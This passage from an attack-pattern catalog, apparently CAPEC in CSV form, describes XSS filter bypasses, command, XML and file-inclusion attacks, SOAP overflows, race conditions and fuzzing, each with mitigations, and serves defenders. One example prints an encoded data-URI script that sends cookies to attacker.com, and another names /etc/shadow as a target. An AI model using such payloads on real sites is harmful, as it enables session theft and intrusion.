that are GET method forms rather than POST forms.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browser's plugins are available to facilitate the analysis or automate the URL discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe identified potential entry points for reflected XSS vulnerability] The adversary uses the entry points gathered in the Explore phase as a target list and injects various payloads formatted as data URI schemes using base to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited.:TECHNIQUE:Use a list of XSS probe strings using different URI schemes to inject in parameters of known URLs. If possible, the probe strings contain a unique identifier to trace the injected string back to the entry point.:TECHNIQUE:Use a proxy tool to record results of manual input of XSS probes in known URLs.::STEP:3:PHASE:Experiment:DESCRIPTION:[Craft malicious XSS URL] Once the adversary has determined which parameters are vulnerable to XSS, they will craft a malicious URL containing the XSS exploit. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from the victim.:TECHNIQUE:Change a URL parameter to include a malicious payload formatted as a URI scheme, or use the URL returned when the URI scheme was given as input to the web application.:TECHNIQUE:Send information gathered from the malicious script to a remote endpoint.::STEP:4:PHASE:Exploit:DESCRIPTION:[Get victim to click URL] In order for the attack to be successful, the victim needs to access the malicious URL.:TECHNIQUE:Send a phishing email to the victim containing the malicious URL. This can be hidden in a hyperlink as to not show the full URL, which might draw suspicion.:TECHNIQUE:Put the malicious URL on a public forum, where many victims might accidentally click the link.::","::Target client software must allow scripting such as JavaScript and allows executable content delivered using a data URI scheme.::","::SKILL:To inject the malicious payload in a web page:LEVEL:Medium::","::Ability to send HTTP request to a web application::","","::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-Repudiation:TECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::","::Design: Use browser technologies that do not allow client side scripting.::Design: Utilize strict type, character, and encoding enforcement.::Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.::Implementation: Ensure all content coming from the client is using the same encoding; if not, the server-side application must canonicalize the data before applying any filtering.::Implementation: Perform input validation for all remote content, including remote and user-generated content::Implementation: Perform output validation for all remote content.::Implementation: Disable scripting languages such as JavaScript in browser::Implementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.::","::The following payload data: text/html;base64,PGh0bWw+PGJvZHk+PHNjcmlwdD52YXIgaW1nID0gbmV3IEltYWdlKCk7IGltZy5zcmMgPSAiaHR0cDovL2F0dGFja2VyLmNvbS9jb29raWVncmFiYmVyPyIrIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5jb29raWVzKTs8L3NjcmlwdD48L2JvZHk+PC9odG1sPg== represents a base64 encoded HTML and uses the data URI scheme to deliver it to the browser. The decoded payload is the following piece of HTML code: <html><body><script>var img = new Image();img.src = http://attacker.com/cookiegrabber?+ encodeURIComponent(document.cookies); </script> </body> </html> Web applications that take user controlled inputs and reflect them in URI HTML placeholder without a proper validation are at risk for such an attack. An adversary could inject the previous payload that would be placed in a URI placeholder (for example in the anchor tag HREF attribute): <a href=INJECTION_POINT>My Link</a> Once the victim clicks on the link, the browser will decode and execute the content from the payload. This will result on the execution of the cross-site scripting attack.::","::83::","","",
245,"XSS Using Doubled Characters",Detailed,Draft,"The adversary bypasses input validation by using doubled characters in order to perform a cross-site scripting attack. Some filters fail to recognize dangerous sequences if they are preceded by repeated characters. For example, by doubling the < before a script command, (<<script or %3C%3script using URI encoding) the filters of some web applications may fail to recognize the presence of a script tag. If the targeted server is vulnerable to this type of bypass, the adversary can create a crafted URL or other trap to cause a victim to view a page on the targeted server where the malicious content is executed, as per a normal XSS attack.","",,Medium,"::NATURE:ChildOf:CAPEC ID:591::NATURE:ChildOf:CAPEC ID:592::NATURE:ChildOf:CAPEC ID:588::","::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for user-controllable inputs] Using a browser or an automated tool, an adversary follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application.:TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe identified potential entry points for XSS using double characters] The adversary uses the entry points gathered in the Explore phase as a target list and injects various common script payloads modified to use double characters and doubled special characters to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited.:TECHNIQUE:Use a list of XSS probe strings using double characters to inject script in parameters of known URLs. If possible, the probe strings contain a unique identifier.:TECHNIQUE:Use a proxy tool to record results of manual input of XSS probes in known URLs.:TECHNIQUE:Use a list of doubled HTML special characters to inject into parameters of known URLs and check if they were properly encoded, replaced, or filtered out.::STEP:3:PHASE:Experiment:DESCRIPTION:[Craft malicious XSS URL] Once the adversary has determined which parameters are vulnerable to XSS, they will craft a malicious URL containing the XSS exploit. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from the victim.:TECHNIQUE:Execute a script using an expression embedded in an HTML attribute, which avoids needing to inject a script tag.:TECHNIQUE:Send information gathered from the malicious script to a remote endpoint.::STEP:4:PHASE:Exploit:DESCRIPTION:[Get victim to click URL] In order for the attack to be successful, the victim needs to access the malicious URL.:TECHNIQUE:Send a phishing email to the victim containing the malicious URL. This can be hidden in a hyperlink as to not show the full URL, which might draw suspicion.:TECHNIQUE:Put the malicious URL on a public forum, where many victims might accidentally click the link.::","::The targeted web application does not fully normalize input before checking for prohibited syntax. In particular, it must fail to recognize prohibited methods preceded by certain sequences of repeated characters.::","","::The adversary must trick the victim into following a crafted link to a vulnerable server or view a web post where the dangerous commands are executed.::","","","::Design: Use libraries and templates that minimize unfiltered input.::Implementation: Normalize, filter and sanitize all user supplied fields.::Implementation: The victim should configure the browser to minimize active content from untrusted sources.::","","::85::","","",
247,"XSS Using Invalid Characters",Detailed,Draft,"An adversary inserts invalid characters in identifiers to bypass application filtering of input. Filters may not scan beyond invalid characters but during later stages of processing content that follows these invalid characters may still be processed. This allows the adversary to sneak prohibited commands past filters and perform normally prohibited operations. Invalid characters may include null, carriage return, line feed or tab in an identifier. Successful bypassing of the filter can result in a XSS attack, resulting in the disclosure of web cookies or possibly other results.","",,Medium,"::NATURE:ChildOf:CAPEC ID:591::NATURE:ChildOf:CAPEC ID:592::NATURE:ChildOf:CAPEC ID:588::","::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for user-controllable inputs] Using a browser or an automated tool, an adversary follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application.:TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe identified potential entry points for XSS vulnerabilities using invalid characters] The adversary uses the entry points gathered in the Explore phase as a target list and injects various common script payloads and special characters preceded by an invalid character(s) to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited. The adversary is looking for cases where an invalid character causes an input filter to stop processing, allowing the malicious input that follows to bypass the filter:TECHNIQUE:Use a list of XSS probe strings preceded by an invalid character(s) such as null, carriage return, line feed, or tab to inject script in parameters of known URLs. If possible, the probe strings contain a unique identifier.:TECHNIQUE:Use a proxy tool to record results of manual input of XSS probes in known URLs.:TECHNIQUE:Use a list of HTML special characters preceded by an invalid character(s) to inject into parameters of known URLs and check if they were properly encoded, replaced, or filtered out.::STEP:3:PHASE:Experiment:DESCRIPTION:[Craft malicious XSS URL] Once the adversary has determined which parameters are vulnerable to XSS, they will craft a malicious URL containing the XSS exploit. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from the victim.:TECHNIQUE:Change a URL parameter to include a malicious script tag preceded by invalid character(s).:TECHNIQUE:Send information gathered from the malicious script to a remote endpoint.::STEP:4:PHASE:Exploit:DESCRIPTION:[Get victim to click URL] In order for the attack to be successful, the victim needs to access the malicious URL.:TECHNIQUE:Send a phishing email to the victim containing the malicious URL. This can be hidden in a hyperlink as to not show the full URL, which might draw suspicion.:TECHNIQUE:Put the malicious URL on a public forum, where many victims might accidentally click the link.::","::The target must fail to remove invalid characters from input and fail to adequately scan beyond these characters.::","","::None: No specialized resources are required to execute this type of attack.::","","","::Design: Use libraries and templates that minimize unfiltered input.::Implementation: Normalize, filter and use an allowlist for any input that will be included in any subsequent web pages or back end operations.::Implementation: The victim should configure the browser to minimize active content from untrusted sources.::","","::86::","","",
248,"Command Injection",Meta,Stable,"An adversary looking to execute a command of their choosing, injects new items into an existing command thus modifying interpretation away from what was intended. Commands in this context are often standalone strings that are interpreted by a downstream component and cause specific responses. This type of attack is possible when untrusted values are used to build these command strings. Weaknesses in input validation or command construction can enable the attack and lead to successful exploitation.","",Medium,High,"","","::The target application must accept input from the user and then use this input in the construction of commands to be executed. In virtually all cases, this is some form of string input that is concatenated to a constant string defined by the application to form the full command to be executed.::","","","","::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:A successful command injection attack enables an adversary to alter the command being executed and achieve a variety of negative consequences depending on the makeup of the new command. This includes potential information disclosure or the corruption of application data.::","::All user-controllable input should be validated and filtered for potentially unwanted characters. Using an allowlist for input is desired, but if use of a denylist approach is necessary, then focusing on command related terms and delimiters is necessary.::Input should be encoded prior to use in commands to make sure command related characters are not treated as part of the command. For example, quotation characters may need to be encoded so that the application does not treat the quotation as a delimiter.::Input should be parameterized, or restricted to data sections of a command, thus removing the chance that the input will be treated as part of the command itself.::","","::77::","TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Command Injection::","",
25,"Forced Deadlock",Meta,Stable,"The adversary triggers and exploits a deadlock condition in the target software to cause a denial of service. A deadlock can occur when two or more competing actions are waiting for each other to finish, and thus neither ever does. Deadlock conditions can be difficult to detect.","",Low,High,"","::STEP:1:PHASE:Explore:DESCRIPTION:The adversary initiates an exploratory phase to get familiar with the system.::STEP:2:PHASE:Explore:DESCRIPTION:The adversary triggers a first action (such as holding a resource) and initiates a second action which will wait for the first one to finish.::STEP:3:PHASE:Explore:DESCRIPTION:If the target program has a deadlock condition, the program waits indefinitely resulting in a denial of service.::","::The target host has a deadlock condition. There are four conditions for a deadlock to occur, known as the Coffman conditions. [REF-101]::The target host exposes an API to the user.::","::SKILL:This type of attack may be sophisticated and require knowledge about the system's resources and APIs.:LEVEL:Medium::","","","::SCOPE:Availability:TECHNICAL IMPACT:Resource Consumption:NOTE:A successful forced deadlock attack compromises the availability of the system by exhausting its available resources.::","::Use known algorithm to avoid deadlock condition (for instance non-blocking synchronization algorithms).::For competing actions, use well-known libraries which implement synchronization.::","::An example of a deadlock which may occur in database products is the following. Client applications using the database may require exclusive access to a table, and in order to gain exclusive access they ask for a lock. If one client application holds a lock on a table and attempts to obtain the lock on a second table that is already held by a second client application, this may lead to deadlock if the second application then attempts to obtain the lock that is held by the first application (Source: Wikipedia, http://en.wikipedia.org/wiki/Deadlock)::","::412::567::662::667::833::1322::","TAXONOMY NAME:ATTACK:ENTRY ID:1499.004:ENTRY NAME:Endpoint Denial of Service: Application or System Exploitation::","",
250,"XML Injection",Standard,Draft,"An attacker utilizes crafted XML user-controllable input to probe, attack, and inject data into the XML database, using techniques similar to SQL injection. The user-controllable input can allow for unauthorized viewing of data, bypassing authentication or the front-end application for direct XML database access, and possibly altering database information.","",High,,"::NATURE:ChildOf:CAPEC ID:248::","::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the Target] Using a browser or an automated tool, an adversary records all instances of user-controllable input used to contruct XML queries:TECHNIQUE:Use an automated tool to record all instances of user-controllable input used to contruct XML queries.:TECHNIQUE:Use a browser to manually explore the website and analyze how the application processes inputs.::STEP:2:PHASE:Experiment:DESCRIPTION:[Determine the Structure of Queries] Using manual or automated means, test inputs found for XML weaknesses.:TECHNIQUE:Use XML reserved characters or words, possibly with other input data to attempt to cause unexpected results and identify improper input validation.::STEP:3:PHASE:Exploit:DESCRIPTION:[Inject Content into XML Queries] Craft malicious content containing XML expressions that is not validated by the application and is executed as part of the XML queries.:TECHNIQUE:Use the crafted input to execute unexpected queries that can disclose sensitive database information to the attacker.::","::XML queries used to process user input and retrieve information stored in XML documents::User-controllable input not properly sanitized::","::SKILL:An attacker must have knowledge of XML syntax and constructs in order to successfully leverage XML Injection:LEVEL:Low::","::None: No specialized resources are required to execute this type of attack.::","::Too many exceptions generated by the application as a result of malformed queries::","::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::","::Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as content that can be interpreted in the context of an XML data or a query.::Use of custom error pages - Attackers can glean information about the nature of queries from descriptive error messages. Input validation must be coupled with customized error pages that inform about an error without disclosing information about the database or application.::","::Consider an application that uses an XML database to authenticate its users. The application retrieves the user name and password from a request and forms an XPath expression to query the database. An attacker can successfully bypass authentication and login without valid credentials through XPath Injection. This can be achieved by injecting the query to the XML database with XPath syntax that causes the authentication check to fail. Improper validation of user-controllable input and use of a non-parameterized XPath expression enable the attacker to inject an XPath expression that causes authentication bypass.::","::91::74::20::707::","TAXONOMY NAME:WASC:ENTRY ID:23:ENTRY NAME:XML Injection::","",
251,"Local Code Inclusion",Standard,Stable,"The attacker forces an application to load arbitrary code files from the local machine. The attacker could use this to try to load old versions of library files that have known vulnerabilities, to load files that the attacker placed on the local machine during a prior attack, or to otherwise change the functionality of the targeted application in unexpected ways.","",,Medium,"::NATURE:ChildOf:CAPEC ID:175::","","::The targeted application must have a bug that allows an adversary to control which code file is loaded at some juncture.::Some variants of this attack may require that old versions of some code files be present and in predictable locations.::","","::The adversary needs to have enough access to the target application to control the identity of a locally included file. The attacker may also need to be able to upload arbitrary code files to the target machine, although any location for these files may be acceptable.::","","::SCOPE:Integrity:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Through local code inclusion, the adversary compromises the integrity of the application.::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data:NOTE:An attacker may leverage local code inclusion in order to print sensitive data to a page, such as hidden configuration files or or password hashes.::","::Implementation: Avoid passing user input to filesystem or framework API. If necessary to do so, implement a specific, allowlist approach.::","","::829::","TAXONOMY NAME:ATTACK:ENTRY ID:1055:ENTRY NAME:Process Injection::","",
252,"PHP Local File Inclusion",Detailed,Draft,"The attacker loads and executes an arbitrary local PHP file on a target machine. The attacker could use this to try to load old versions of PHP files that have known vulnerabilities, to load PHP files that the attacker placed on the local machine during a prior attack, or to otherwise change the functionality of the targeted application in unexpected ways.","",,Medium,"::NATURE:ChildOf:CAPEC ID:251::","::STEP:1:PHASE:Explore:DESCRIPTION:[Survey application] Using a browser or an automated tool, an adversary follows all public links on a web site. They record all the links they find. The adversary is looking for URLs that show PHP file inclusion is used, which can look something like http://vulnerable-website/file.php?file=index.php.:TECHNIQUE:Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browser's plugins are available to facilitate the analysis or automate the URL discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:[Attempt variations on input parameters] Once the adversary finds a vulnerable URL that takes file input, they attempt a variety of path traversal techniques to attempt to get the application to display the contents of a local file, or execute a different PHP file already stored locally on the server.:TECHNIQUE:Use a list of probe strings to inject in parameters of known URLs. The probe strings are variants of path traversal techniques used to include well known files.:TECHNIQUE:Use a proxy tool to record results of manual input of local file inclusion probes in known URLs.::STEP:3:PHASE:Exploit:DESCRIPTION:[Include desired local file] Once the adversary has determined which techniques of path traversal successfully work with the vulnerable PHP application, they will target a specific local file to include. These can be files such as /etc/passwd, /etc/shadow, or configuration files for the application that might expose sensitive information.::","::The targeted PHP application must have a bug that allows an attacker to control which code file is loaded at some juncture.::","","::The attacker needs to have enough access to the target application to control the identity of a locally included PHP file.::","","","","","::829::","","",
253,"Remote Code Inclusion",Standard,Draft,"The attacker forces an application to load arbitrary code files from a remote location. The attacker could use this to try to load old versions of library files that have known vulnerabilities, to load malicious files that the attacker placed on the remote machine, or to otherwise change the functionality of the targeted application in unexpected ways.","",,,"::NATURE:ChildOf:CAPEC ID:175::NATURE:CanPrecede:CAPEC ID:664::","","::Target application server must allow remote files to be included.The malicious file must be placed on the remote machine previously.::","","","","","::Minimize attacks by input validation and sanitization of any user data that will be used by the target application to locate a remote file to be included.::","","::829::","TAXONOMY NAME:WASC:ENTRY ID:05:ENTRY NAME:Remote File Inclusion::","",
256,"SOAP Array Overflow",Detailed,Draft,"An attacker sends a SOAP request with an array whose actual length exceeds the length indicated in the request. If the server processing the transmission naively trusts the specified size, then an attacker can intentionally understate the size of the array, possibly resulting in a buffer overflow if the server attempts to read the entire data set into the memory it allocated for a smaller array.","",,High,"::NATURE:ChildOf:CAPEC ID:100::","::STEP:1:PHASE:Explore:DESCRIPTION:[Identify target application] The adversary identifies a target application to perform the buffer overflow on. In this attack, adversaries look for applications that utilize SOAP as a communication mechanism.::STEP:2:PHASE:Experiment:DESCRIPTION:[Find injection vector] The adversary identifies an injection vector to deliver the excessive content to the targeted application's buffer.:TECHNIQUE:The adversary creates a SOAP message that incorrectly specifies the size of its array to be smaller than the size of the actual content by a large margin and sends it to the application. If this causes a crash or some unintended behavior, it is likely that this is a valid injection vector.::STEP:3:PHASE:Experiment:DESCRIPTION:[Craft overflow content] The adversary crafts the content to be injected. If the intent is to simply cause the software to crash, the content need only consist of an excessive quantity of random data. If the intent is to leverage the overflow for execution of arbitrary code, the adversary crafts the payload in such a way that the overwritten return address is replaced with one of the adversary's choosing.:TECHNIQUE:Create malicious shellcode that will execute when the program execution is returned to it.:TECHNIQUE:Use a NOP-sled in the overflow content to more easily slide into the malicious code. This is done so that the exact return address need not be correct, only in the range of all of the NOPs:TECHNIQUE:The adversary will choose a SOAP type that allows them to put shellcode into the buffer when the array is read into the application.::STEP:4:PHASE:Exploit:DESCRIPTION:[Overflow the buffer] Using the injection vector, the adversary sends the crafted SOAP message to the program, overflowing the buffer.::","::The targeted SOAP server must trust that the array size as stated in messages it receives is correct, but read through the entire content of the message regardless of the stated size of the array.::","","::The attacker must be able to craft malformed SOAP messages, specifically, messages with arrays where the stated array size understates the actual size of the array in the message.::","","","::If the server either verifies the correctness of the stated array size or if the server stops processing an array once the stated number of elements have been read, regardless of the actual array size, then this attack will fail. The former detects the malformed SOAP message while the latter ensures that the server does not attempt to load more data than was allocated for.::","","::805::","TAXONOMY NAME:WASC:ENTRY ID:35:ENTRY NAME:SOAP Array Abuse::","",
26,"Leveraging Race Conditions",Meta,Stable,"The adversary targets a race condition occurring when multiple processes access and manipulate the same resource concurrently, and the outcome of the execution depends on the particular order in which the access takes place. The adversary can leverage a race condition by running the race, modifying the resource and modifying the normal execution flow. For instance, a race condition can occur while accessing a file: the adversary can trick the system by replacing the original file with their version and cause the system to read the malicious file.","",High,High,"","::STEP:1:PHASE:Explore:DESCRIPTION:The adversary explores to gauge what level of access they have.::STEP:2:PHASE:Experiment:DESCRIPTION:The adversary gains access to a resource on the target host. The adversary modifies the targeted resource. The resource's value is used to determine the next normal execution action.::STEP:3:PHASE:Exploit:DESCRIPTION:The resource is modified/checked concurrently by multiple processes. By using one of the processes, the adversary is able to modify the value just before it is consumed by a different process. A race condition occurs and is exploited by the adversary to abuse the target host.::","::A resource is accessed/modified concurrently by multiple processes such that a race condition exists.::The adversary has the ability to modify the resource.::","::SKILL:Being able to run the race requires basic knowledge of concurrent processing including synchonization techniques.:LEVEL:Medium::","","","::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::","::Use safe libraries to access resources such as files.::Be aware that improper use of access function calls such as chown(), tempfile(), chmod(), etc. can cause a race condition.::Use synchronization to control the flow of execution.::Use static analysis tools to find race conditions.::Pay attention to concurrency problems related to the access of resources.::","::The Net Direct client for Linux before 6.0.5 in Nortel Application Switch 2424, VPN 3050 and 3070, and SSL VPN Module 1000 extracts and executes files with insecure permissions, which allows local users to exploit a race condition to replace a world-writable file in /tmp/NetClient and cause another user to execute arbitrary code when attempting to execute this client, as demonstrated by replacing /tmp/NetClient/client. See also: CVE-2007-1057::The following code illustrates a file that is accessed multiple times by name in a publicly accessible directory. A race condition exists between the accesses where an attacker can replace the file referenced by the name (see [REF-107]). include <sys/types.h>include <fcntl.h>include <unistd.h> define FILE /tmp/myfiledefine UID 100 void test(char *str){int fd;fd = creat(FILE, 0644);if(fd == -1)return; chown(FILE, UID, -1); /* BAD */close(fd); } int main(int argc, char **argv){char *userstr;if(argc > 1) {userstr = argv[1];test(userstr); }return 0; }::","::368::363::366::370::362::662::689::667::665::1223::1254::1298::","","",
261,"Fuzzing for garnering other adjacent user/sensitive data",Detailed,Draft,"An adversary who is authorized to send queries to a target sends variants of expected queries in the hope that these modified queries might return information (directly or indirectly through error logs) beyond what the expected set of queries should provide.","",,Medium,"::NATURE:ChildOf:CAPEC ID:54::","::STEP:1:PHASE:Explore:DESCRIPTION:[Observe communication and inputs] The fuzzing adversary observes the target system looking for inputs and communications between modules, subsystems, or systems.:TECHNIQUE:Network sniffing. Using a network sniffer such as wireshark, the adversary observes communications into and out of the target system.:TECHNIQUE:Monitor API execution. Using a tool such as ktrace, strace, APISpy, or another debugging tool, the adversary observes the system calls and API calls that are made by the target system, and the nature of their parameters.:TECHNIQUE:Observe inputs using web inspection tools (OWASP's WebScarab, Paros, TamperData, TamperIE, etc.)::STEP:2:PHASE:Experiment:DESCRIPTION:[Generate fuzzed inputs] Given a fuzzing tool, a target input or protocol, and limits on time, complexity, and input variety, generate a list of inputs to try. Although fuzzing is random, it is not exhaustive. Parameters like length, composition, and how many variations to try are important to get the most cost-effective impact from the fuzzer.:TECHNIQUE:Boundary cases. Generate fuzz inputs that attack boundary cases of protocol fields, inputs, or other communications limits. Examples include 0xff and 0x00 for single-byte inputs. In binary situations, approach each bit of an individual field with on and off (e.g., 0x80).:TECHNIQUE:Attempt arguments to system calls or APIs. The variations include payloads that, if they were successful, could lead to a compromise on the system.::STEP:3:PHASE:Experiment:DESCRIPTION:[Observe the outcome] Observe the outputs to the inputs fed into the system by fuzzers and see if there are any log or error messages that either provide user/sensitive data or give information about an expected template that could be used to produce this data.::STEP:4:PHASE:Exploit:DESCRIPTION:[Craft exploit payloads] If the logs did not reveal any user/sensitive data, an adversary will attempt to make the fuzzing inputs form to an expected template:TECHNIQUE:Create variants of expected templates that request additional information:TECHNIQUE:Create variants that exclude limiting clauses:TECHNIQUE:Create variants that alter fields taht identify the requester in order to subvert access controls:TECHNIQUE:Repeat different fuzzing variants until sensitive information is divulged::","::The server must assume that the queries it receives follow specific templates and/or have fields or attributes that follow specific procedures. The server must process queries that it receives without adequately checking or sanitizing queries to ensure they follow these templates.::","","::The attacker must have sufficient privileges to send queries to the targeted server. A normal client might limit the nature of these queries, so the attacker must either have a modified client or their own application which allows them to modify the expected queries.::","","","","::A client that queries an employee database might have templates such that the user only supplies the target's name and the template dictates the fields to be returned (location, position in the company, phone number, etc.). If the server does not verify that the query matches one of the expected templates, an attacker who is allowed to send normal queries could modify their query to try to return additional information. For this example, additional information might include social security numbers or salaries.::","::20::","","",
263,"Force Use of Corrupted Files",Detailed,Draft,"This describes an attack where an application is forced to use a file that an attacker has corrupted. The result is often a denial of service caused by the application being unable to process the corrupted file, but other results, including the disabling of filters or access controls (if the application fails in an unsafe way rather than failing by locking down) or buffer overflows are possible.","",,Medium,"::NATURE:ChildOf:CAPEC ID:17::","","::The targeted application must utilize a configuration file that an attacker is able to corrupt. In some cases, the attacker must be able to force the (re-)reading of the corrupted file if the file is normally only consulted at startup.::The severity of the attack hinges on how the application responds to the corrupted file. If the application detects the corruption and locks down, this may result in the denial of services provided by the application. If the application fails to detect the corruption, the result could be a more severe denial of service (crash or hang) or even an exploitable buffer overflow. If the application detects the corruption but fails in an unsafe way, this attack could result in the continuation of services but without certain security structures, such as filters or access controls. For example, if the corrupted file configures filters, an unsafe response from an application could result in simply disabling the filtering mechanisms due to the lack of usable configuration data.::","","::This varies depending on the resources necessary to corrupt the configuration file and the resources needed to force the application to re-read it (if any).::","","","","","::829::","","",
267,"Leverage Alternate Encoding",Standard,Draft,"An adversary leverages the possibility to encode potentially harmful input or content used by applications such that the applications are ineffective at validating this encoding standard.","",High,High,"::NATURE:ChildOf:CAPEC ID:153::","::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for user-controllable inputs] Using a browser, an automated tool or by inspecting the application, an adversary records all entry points to the application.:TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.:TECHNIQUE:Manually inspect the application to find entry points.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe entry points to locate vulnerabilities] The adversary uses the entry points gathered in the Explore phase as a target list and injects various payloads using a variety of different types of encodings to determine if an entry point actually represents a vulnerability with insufficient validation logic and to characterize the extent to which the vulnerability can be exploited.:TECHNIQUE:Try to use different encodings of content in order to bypass validation routines.::","::The application's decoder accepts and interprets encoded characters. Data canonicalization, input filtering and validating is not done properly leaving the door open to harmful characters for the target host.::","::SKILL:An adversary can inject different representation of a filtered character in a different encoding.:LEVEL:Low::SKILL:An adversary may craft subtle encoding of input data by using the knowledge that they have gathered about the target host.:LEVEL:Medium::","","","::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-Repudiation:TECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution:TECHNICAL IMPACT:Resource Consumption:NOTE:Denial of Service::","::Assume all input might use an improper representation. Use canonicalized data inside the application; all data must be converted into the representation used inside the application (UTF-8, UTF-16, etc.)::Assume all input is malicious. Create an allowlist that defines all valid input to the software system based on the requirements specifications. Input that does not match against the allowlist should not be permitted to enter into the system. Test your decoding process against malicious input.::","::Microsoft Internet Explorer 5.01 SP4, 6, 6 SP1, and 7 does not properly handle unspecified encoding strings, which allows remote adversaries to bypass the Same Origin Policy and obtain sensitive information via a crafted web site, aka Post Encoding Information Disclosure Vulnerability. Related Vulnerabilities CVE-2010-0488::Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.::","::173::172::180::181::73::74::20::697::692::","TAXONOMY NAME:ATTACK:ENTRY ID:1027:ENTRY NAME:Obfuscated Files or Information::","",